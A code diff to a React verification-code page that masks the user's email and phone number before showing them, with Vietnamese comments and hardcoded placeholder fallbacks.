@@ -26,18 +26,43 @@ const Verify = () => {
         }
     }, []);
 
-    // Format số điện thoại chỉ hiển thị 2 số cuối
+    // Format email: s****g@m****.com
+    const formatEmailForDisplay = (email) => {
+        if (!email) return 's****g@m****.com';
+        const parts = email.split('@');
+        if (parts.length !== 2) return email;
+        
+        const username = parts[0];
+        const domain = parts[1];
+        const domainParts = domain.split('.');
+        
+        if (username.length <= 1) return email;
+        if (domainParts.length < 2) return email;
+        
+        // Format: s****g (ký tự đầu + *** + ký tự cuối)
+        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
+        
+        // Format: m****.com (ký tự đầu + *** + .com)
+        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
+        
+        return formattedUsername + '@' + formattedDomain;
+    };
+
+    // Format số điện thoại: ******32 (6 sao + 2 số cuối)
     const formatPhoneForDisplay = (phone) => {
-        if (!phone) return '******';
+        if (!phone) return '******32';
         const cleanPhone = phone.replace(/^\+\d+\s*/, '');
-        if (cleanPhone.length <= 2) return '******';
-        return '*'.repeat(cleanPhone.length - 2) + cleanPhone.slice(-2);
+        if (cleanPhone.length < 2) return '******32';
+        
+        // Luôn hiển thị 6 sao + 2 số cuối
+        const lastTwoDigits = cleanPhone.slice(-2);
+        return '*'.repeat(6) + lastTwoDigits;
     };
 
     const defaultTexts = useMemo(
         () => ({
             title: 'Check your email',
-            description: `We have sent a verification code to your ${userInfo.email} and ${formatPhoneForDisplay(userInfo.phone)}. Please enter the code we just sent to continue.`,
+            description: `We have sent a verification code to your ${formatEmailForDisplay(userInfo.email)} and ${formatPhoneForDisplay(userInfo.phone)}. Please enter the code we just sent to continue.`,
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
